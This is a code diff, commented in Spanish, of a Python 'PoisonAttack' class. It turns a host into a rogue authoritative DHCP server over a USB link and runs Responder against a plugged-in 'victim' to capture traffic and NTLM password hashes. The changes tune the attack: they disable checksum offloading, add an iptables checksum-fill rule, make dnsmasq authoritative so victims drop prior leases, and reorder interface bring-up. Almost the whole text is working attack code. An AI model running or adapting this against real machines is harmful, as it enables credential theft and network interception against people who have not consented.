@@ -81,37 +81,43 @@ class PoisonAttack:
             os.system(f"sudo systemctl stop dhcpcd 2>/dev/null")
             os.system(f"sudo dhcpcd -k {iface} 2>/dev/null")
 
-            # 1. BAJAR LA INTERFAZ PRIMERO (Para preparar la trampa)
+            # 1. BAJAR LA INTERFAZ PRIMERO
             os.system(f"sudo ip link set {iface} down 2>/dev/null")
             time.sleep(0.5)
+
+            # [NUEVO] FIX DE CHECKSUM OFFLOADING
+            # Apaga el offloading para evitar que el host Linux descarte los paquetes DHCP
+            os.system(f"sudo ethtool -K {iface} tx off rx off 2>/dev/null")
 
             ip = "192.168.10.1"
             subnet_mask = "24"
             ip_range = "192.168.10.10,192.168.10.250,255.255.255.0,12h"
 
-            # 2. ASIGNAR IP FORZANDO EL BROADCAST CORRECTO (Corrige el 0.0.0.0)
             self.log(f"[*] Asignando IP estática y Broadcast a {iface}...")
             os.system(f"sudo ip addr flush dev {iface} 2>/dev/null")
             os.system(f"sudo ip addr add {ip}/{subnet_mask} broadcast 192.168.10.255 dev {iface}")
             os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
             
-            # Desactivar IPv6 para evitar confusiones de enrutamiento
+            # Desactivar IPv6 para forzar IPv4 instantáneo
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
 
-            # 3. FIREWALL
-            self.log("[*] Configurando firewall para DHCP...")
+            # 3. FIREWALL Y REPARACIÓN DE PAQUETES
+            self.log("[*] Configurando firewall y forzando reparación de Checksums...")
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 67 -j ACCEPT")
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 68 -j ACCEPT")
             os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --sport 67 -j ACCEPT")
             os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --dport 68 -j ACCEPT")
+            
+            # [NUEVO] Regla maestra: Si ethtool falla, esta regla intercepta el DHCP y reconstruye la firma
+            os.system("sudo iptables -t mangle -A POSTROUTING -p udp --dport 68 -j CHECKSUM --checksum-fill 2>/dev/null")
 
-            # 4. CONFIGURACIÓN EN /TMP (Previene errores de permisos del demonio)
+            # 4. CONFIGURACIÓN DHCP DE ALTA AGRESIVIDAD
             config_path = "/tmp/dnsmasq_poison.conf"
             config_dhcp = (
                 f"interface={iface}\n"
-                f"bind-dynamic\n"
+                f"bind-interfaces\n"          # Estricto al adaptador
                 f"listen-address={ip}\n"
                 f"dhcp-range={ip_range}\n"
                 f"dhcp-option=1,255.255.255.0\n"
@@ -120,6 +126,7 @@ class PoisonAttack:
                 f"dhcp-option=28,192.168.10.255\n"
                 f"dhcp-option=15,\n"
                 f"dhcp-option=252,\n"
+                f"dhcp-authoritative\n"       # [NUEVO] Obliga a la víctima a olvidar IPs anteriores de golpe
                 f"no-resolv\n"
                 f"no-hosts\n"
                 f"port=0\n"
@@ -129,19 +136,18 @@ class PoisonAttack:
                 f.write(config_dhcp)
             os.system(f"sudo chmod 644 {config_path}")
 
-            # 5. INICIAR DNSMASQ ANTES DE LEVANTAR EL ENLACE
-            # Al usar bind-dynamic, dnsmasq puede arrancar aunque la interfaz esté caída.
-            self.log("[*] Iniciando servidor DHCP en modo de espera...")
+            # 5. LEVANTAR EL ENLACE ANTES DE INICIAR EL DHCP
+            self.log("[*] Levantando enlace USB...")
+            os.system(f"sudo ip link set {iface} up")
+            time.sleep(1) # Darle al kernel 1s para estabilizar la interfaz
+            os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
+
+            # 6. INICIAR DHCP
+            self.log("[*] Iniciando servidor DHCP Autoritativo...")
             self.dns_proc = subprocess.Popen(
                 ["sudo", "dnsmasq", "-C", config_path, "-d"],
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
             )
-            time.sleep(1) # Un segundo para que el proceso asiente el puerto 67
-
-            # 6. AHORA LEVANTAMOS EL ENLACE (Evita perder el primer paquete del host)
-            self.log("[*] Levantando enlace USB para cacería inmediata...")
-            os.system(f"sudo ip link set {iface} up")
-            os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
             time.sleep(1)
 
             # Detección de Responder
@@ -161,6 +167,8 @@ class PoisonAttack:
             self.log(f"[+] IP: {ip}/{subnet_mask}")
             self.log(f"[+] OBJETIVO: Captura de tráfico y hashes NTLM")
             self.log(f"[+] Conecta ahora la víctima al puerto USB")
+
+
 
             self.proc_responder = subprocess.Popen(
                 responder_cmd,
@@ -207,7 +215,12 @@ class PoisonAttack:
         os.system(f"sudo iptables -D INPUT -i {self.interface} -p udp --dport 68 -j ACCEPT 2>/dev/null")
         os.system(f"sudo iptables -D OUTPUT -o {self.interface} -p udp --sport 67 -j ACCEPT 2>/dev/null")
         os.system(f"sudo iptables -D OUTPUT -o {self.interface} -p udp --dport 68 -j ACCEPT 2>/dev/null")
+        os.system("sudo iptables -t mangle -D POSTROUTING -p udp --dport 68 -j CHECKSUM --checksum-fill 2>/dev/null")
+       
         os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
+
+
+        
         os.system(f"sudo ip addr flush dev {self.interface} > /dev/null 2>&1")
         # Restaurar servicios detenidos
         os.system("sudo systemctl start systemd-resolved 2>/dev/null")
